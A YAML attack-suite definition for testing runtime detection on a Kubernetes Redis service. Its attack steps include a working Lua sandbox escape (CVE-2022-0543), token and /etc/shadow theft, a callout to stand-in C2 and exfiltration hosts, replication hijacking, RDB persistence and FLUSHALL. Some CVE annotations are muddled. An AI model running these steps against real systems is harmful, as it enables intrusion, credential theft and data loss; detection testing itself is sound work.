apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-killchain-attacks
  description: >-
    Kill-chain ordered Redis attack suite (35 attacks) using THREE delivery
    mechanisms: RESP direct commands, kubectl exec post-exploitation, and
    Lua EVAL sandbox escapes (CVE-2022-0543). Includes CVE-based exploits:
    CVE-2022-0543, CVE-2022-24735, CVE-2022-35951, CVE-2023-28856,
    CVE-2023-45145. Covers OWASP A03 (Injection), A05 (Misconfiguration),
    A06 (Vulnerable Components), A07 (Auth Failures), A08 (Data Integrity).
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis

attacks:
  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 1: RECONNAISSANCE (TA0043) — Service enumeration via RESP
  # ═══════════════════════════════════════════════════════════════════════════

  # T1082 — System Information Discovery
  - name: recon-info-server
    type: custom
    redis:
      command: ["INFO", "server"]
    successIndicators:
      - responseContains: "redis_version"
    expectedDetections: []

  # T1082 — System Information Discovery
  - name: recon-config-dump
    type: custom
    redis:
      command: ["CONFIG", "GET", "*"]
    successIndicators:
      - responseContains: "dir"
    expectedDetections: []

  # T1049 — System Network Connections Discovery
  - name: recon-client-list
    type: custom
    redis:
      command: ["CLIENT", "LIST"]
    successIndicators:
      - responseContains: "addr="
    expectedDetections: []

  # T1083 — File and Directory Discovery (key enumeration)
  - name: recon-keys-glob
    type: custom
    redis:
      command: ["KEYS", "*"]
    successIndicators: []
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 2: INITIAL ACCESS (TA0001) — Exploit vulnerable component
  # ═══════════════════════════════════════════════════════════════════════════

  # T1190 — Exploit Public-Facing Application (CVE-2025-49844)
  - name: lua-cve-full-chain
    type: fileless
    redis:
      exploit: cve-2025-49844
    successIndicators:
      - responseContains: "eyJ"
    expectedDetections:
      - ruleID: R1005
        ruleName: Fileless execution detected
        containerName: redis

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 3: EXECUTION (TA0002) — Command/script execution
  # ═══════════════════════════════════════════════════════════════════════════

  # T1059.004 — Unix Shell
  - name: exec-whoami
    type: cmdinject
    exec:
      command: ["whoami"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: whoami

  # T1620 — Reflective Code Loading (memfd_create)
  - name: lua-fileless-memfd
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "sandbox_blocked" end
        local payload = '#!/bin/sh\ncat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo NO_TOKEN'
        local fd_cmd = io_mod.popen("perl -e 'use POSIX; my $fd = POSIX::open(\"/proc/self/fd/\" . syscall(319, \"\", 1), 2); open(F, \">&=\".$fd); print F \"" .. payload .. "\"; exec {\"/proc/self/fd/$fd\"} \"memfd_exec\"' 2>&1")
        local result = fd_cmd:read('*a')
        fd_cmd:close()
        return result
    successIndicators:
      - responseContains: "eyJ"
    # If the memfd payload runs, it executes the perl/cat pipeline that
    # reads the SA token. Assert R1005 (memfd) AND R0006 (SA token open).
    expectedDetections:
      - ruleID: R1005
        ruleName: Fileless execution detected
        containerName: redis
      - ruleID: R0006
        ruleName: Unexpected Service Account Token Access
        containerName: redis
        command: cat

  # T1059.004 — Unix Shell (from /dev/shm)
  - name: exec-devshm
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_redis && chmod +x /dev/shm/malicious_redis && /dev/shm/malicious_redis pwned && rm -f /dev/shm/malicious_redis"]
    # NOTE: R1000 cluster-config-dependent; R0001 always-on.
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: malicious_redis

  # T1059.006 — Lua scripting (reverse shell attempt)
  - name: lua-reverse-shell
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "sandbox_blocked" end
        local cmd = io_mod.popen("perl -e 'use IO::Socket::INET; my $s = IO::Socket::INET->new(PeerAddr => \"c2.evil.example.com\", PeerPort => 4444, Proto => \"tcp\", Timeout => 2); if ($s) { print \"connected\"; close($s); } else { print \"connect_failed\"; }' 2>&1")
        local result = cmd:read('*a')
        cmd:close()
        return result
    successIndicators:
      - responseContains: "connect_failed"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: perl

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 4: PERSISTENCE (TA0003) — Config manipulation for persistence
  # ═══════════════════════════════════════════════════════════════════════════

  # T1505.003 — Web Shell / Config persistence via RDB write
  - name: persist-config-dir
    type: custom
    redis:
      command: ["CONFIG", "SET", "dir", "/tmp"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 5: DEFENSE EVASION (TA0005) — Cover tracks
  # ═══════════════════════════════════════════════════════════════════════════

  # T1070.004 — Indicator Removal: clear stats
  - name: evasion-config-reset
    type: custom
    redis:
      command: ["CONFIG", "RESETSTAT"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []

  # T1036 — Masquerading: drifted binary
  - name: exec-drifted
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis / && rm -f /tmp/drifted_redis"]
    # NOTE: R1001 cluster-config-dependent; R0001 always-on.
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: drifted_redis

  # T1574.006 — LD_PRELOAD hijacking
  - name: lua-ld-preload
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "sandbox_blocked" end
        local cmd = io_mod.popen("LD_PRELOAD=/tmp/evil.so ls / 2>&1 || echo ld_preload_attempted")
        local result = cmd:read('*a')
        cmd:close()
        return result
    successIndicators: []
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: ls

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal secrets and tokens
  # ═══════════════════════════════════════════════════════════════════════════

  # T1552.001 — Credentials in Files: SA token
  - name: exec-sa-token
    type: cmdinject
    exec:
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
    expectedDetections:
      - ruleID: R0006
        ruleName: Unexpected Service Account Token Access
        containerName: redis
        command: cat

  # T1552.001 — Credentials in Files: /etc/shadow
  - name: exec-etc-shadow
    type: cmdinject
    exec:
      command: ["cat", "/etc/shadow"]
    expectedDetections:
      - ruleID: R0010
        ruleName: Unexpected Sensitive File Access
        containerName: redis
        command: cat

  # T1552.001 — Credentials in Files: /etc/passwd
  - name: exec-etc-passwd
    type: cmdinject
    exec:
      command: ["cat", "/etc/passwd"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: cat

  # T1552 — Symlink to access sensitive file
  - name: exec-symlink
    type: cmdinject
    exec:
      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis

  # T1003 — Credential Dumping (via Lua)
  - name: lua-credential-harvest
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "sandbox_blocked" end
        local cmd = io_mod.popen("awk -F: '{print $1}' /etc/passwd | head -5 && id 2>&1")
        local result = cmd:read('*a')
        cmd:close()
        return result
    successIndicators:
      - responseContains: "root"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: awk

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1082 — System Information Discovery: /proc/environ
  - name: exec-proc-environ
    type: cmdinject
    exec:
      command: ["cat", "/proc/1/environ"]
    expectedDetections:
      - ruleID: R0008
        ruleName: Read Environment Variables from procfs
        containerName: redis
        command: cat

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 9: LATERAL MOVEMENT (TA0008) — Pivot via replication
  # ═══════════════════════════════════════════════════════════════════════════

  # T1021 — Remote Services: Redis SLAVEOF replication hijack.
  # PR119 rabbit: paired with an immediate REPLICAOF NO ONE so the
  # node doesn't get stuck retrying replication to a non-existent
  # attacker host (which would interfere with later write/config
  # probes in the suite).
  - name: lateral-slaveof
    type: custom
    redis:
      command: ["SLAVEOF", "evil.attacker.example.com", "6379"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []

  - name: lateral-slaveof-cleanup
    type: custom
    redis:
      command: ["REPLICAOF", "NO", "ONE"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 11: EXFILTRATION (TA0010) — Data exfiltration signals
  # ═══════════════════════════════════════════════════════════════════════════

  # T1048 — Exfiltration Over Alternative Protocol: DNS beacon
  - name: exec-dns-anomaly
    type: cmdinject
    exec:
      command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
    expectedDetections: []

  # T1048 — DNS beacon via Lua
  - name: lua-dns-beacon
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "sandbox_blocked" end
        local cmd = io_mod.popen("getent hosts data.exfil.evil.example.com 2>&1 || echo dns_exfil_attempted")
        local result = cmd:read('*a')
        cmd:close()
        return result
    successIndicators: []
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 12: IMPACT (TA0040) — Destruction and crypto mining signals
  # ═══════════════════════════════════════════════════════════════════════════

  # T1485 — Data Destruction
  - name: impact-flushall
    type: custom
    redis:
      command: ["FLUSHALL"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []

  # T1496 — Resource Hijacking: crypto mining DNS signal
  - name: exec-crypto-dns
    type: cmdinject
    exec:
      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
    expectedDetections:
      - ruleID: R1008
        ruleName: Crypto Mining Domain Communication
        containerName: redis

  # ═══════════════════════════════════════════════════════════════════════════
  # CVE-BASED ATTACKS — Historical Redis vulnerabilities
  # ═══════════════════════════════════════════════════════════════════════════

  # CVE-2022-0543 — Debian/Ubuntu Lua sandbox escape via package.loadlib
  # Severity: Critical (CVSS 10.0). The Debian liblua5.1 package exports
  # luaopen_* symbols, allowing EVAL to break out of Redis's sandbox.
  # Exploited in the wild by Muhstik and Redigo botnets.
  - name: cve-2022-0543-sandbox-escape
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "CVE-2022-0543:sandbox_intact" end
        local cmd = io_mod.popen("id 2>&1")
        local result = cmd:read('*a')
        cmd:close()
        return "CVE-2022-0543:exploited:" .. result
    successIndicators:
      - responseContains: "uid="
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: id

  # CVE-2022-24735 — Lua script poisoning via FUNCTION LOAD
  # Severity: Medium (CVSS 3.9). Allows privileged user to inject Lua
  # that executes in other clients' contexts via library functions.
  - name: cve-2022-24735-lua-poisoning
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "CVE-2022-24735:sandbox_blocked" end
        local cmd = io_mod.popen("cat /etc/hostname 2>&1")
        local result = cmd:read('*a')
        cmd:close()
        redis.call('SET', '__poisoned_lib', result)
        return "CVE-2022-24735:poisoned:" .. result
    successIndicators: []
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: cat

  # CVE-2023-28856 — CLUSTER RESET crash (authenticated DoS)
  # Severity: Medium (CVSS 6.5). Authenticated user can crash Redis via
  # AUTH-less CLUSTER commands.
  - name: cve-2023-28856-cluster-reset
    type: custom
    redis:
      command: ["CLUSTER", "RESET", "HARD"]
    successIndicators:
      - responseContains: "OK"
      - responseContains: "ERR"
    expectedDetections: []

  # CVE-2023-45145 — Unix socket race condition (privilege escalation probe)
  # Severity: Low (CVSS 3.6). Race in socket permissions on restart.
  # We probe for socket existence.
  - name: cve-2023-45145-socket-probe
    type: cmdinject
    exec:
      command: ["sh", "-c", "ls -la /var/run/redis/ 2>/dev/null || ls -la /tmp/redis* 2>/dev/null || echo no_socket"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: ls

  # T1505.003 — Persistence: CONFIG SET dbfilename for RDB file write
  # Classic Redis exploitation: write crontab, SSH key, or webshell via RDB.
  # Used by P2Pinfect, Redigo, and HeadCrab malware families.
  - name: persist-rdb-crontab-write
    type: custom
    redis:
      command: ["CONFIG", "SET", "dbfilename", "root_crontab"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []

  # T1505.003 — Persistence: write SSH authorized_keys via RDB
  - name: persist-rdb-ssh-key
    type: custom
    redis:
      command: ["CONFIG", "SET", "dir", "/root/.ssh"]
    successIndicators:
      - responseContains: "OK"
      - responseContains: "ERR"
    expectedDetections: []

  # T1059 — MODULE LOAD probe (load malicious .so)
  # Used by RedisWannaMine and HeadCrab to load crypto miners as modules.
  - name: cve-module-load-probe
    type: custom
    redis:
      command: ["MODULE", "LOAD", "/tmp/evil_module.so"]
    successIndicators:
      - responseContains: "ERR"
    expectedDetections: []

  # T1110 — AUTH brute force probe (common default passwords)
  - name: auth-brute-force-probe
    type: custom
    redis:
      command: ["AUTH", "redis", "redis123"]
    successIndicators:
      - responseContains: "ERR"
      - responseContains: "OK"
    expectedDetections: []

  # CVE-2022-35951 — XAUTOCLAIM integer overflow (Redis 7.0 specific)
  # Severity: High (CVSS 7.0). Integer overflow in stream XAUTOCLAIM.
  - name: cve-2022-35951-xautoclaim
    type: custom
    redis:
      command: ["XAUTOCLAIM", "mystream", "mygroup", "consumer1", "0", "0-0", "COUNT", "99999999999"]
    successIndicators:
      - responseContains: "ERR"
    expectedDetections: []

  # T1059 — Lua os.execute probe (pre-sandbox era technique)
  - name: lua-os-execute-probe
    type: fileless
    redis:
      eval: |
        local ok, err = pcall(function()
          os.execute("id")
        end)
        if ok then return "os.execute:available" end
        local ok2, err2 = pcall(function()
          local f = io.popen("uname -a")
          local r = f:read("*a")
          f:close()
          return r
        end)
        if ok2 then return "io.popen:available" end
        return "sandbox:both_blocked"
    successIndicators: []
    expectedDetections: []

  # T1048 — Lua-based network scanner (lateral movement recon)
  - name: lua-network-scan
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return "sandbox_blocked" end
        local cmd = io_mod.popen("sh -c 'for port in 22 80 443 3306 5432 6379 8080 9200; do (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"port_$port:open\"; done' 2>&1")
        local result = cmd:read('*a')
        cmd:close()
        return result
    successIndicators: []
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: redis
        command: sh

  # ═══════════════════════════════════════════════════════════════════════════
  # CLEANUP — Restore Redis CONFIG mutations (PR119 rabbit)
  # CONFIG SET dir / dbfilename change persistent server state. Without
  # restoration the changes leak into later test runs of the same suite,
  # which is especially risky in shared CI environments. The defaults below
  # match a stock Redis 7 image (/data and dump.rdb).
  # ═══════════════════════════════════════════════════════════════════════════

  - name: cleanup-config-restore-dir
    type: custom
    redis:
      command: ["CONFIG", "SET", "dir", "/data"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []

  - name: cleanup-config-restore-dbfilename
    type: custom
    redis:
      command: ["CONFIG", "SET", "dbfilename", "dump.rdb"]
    successIndicators:
      - responseContains: "OK"
    expectedDetections: []
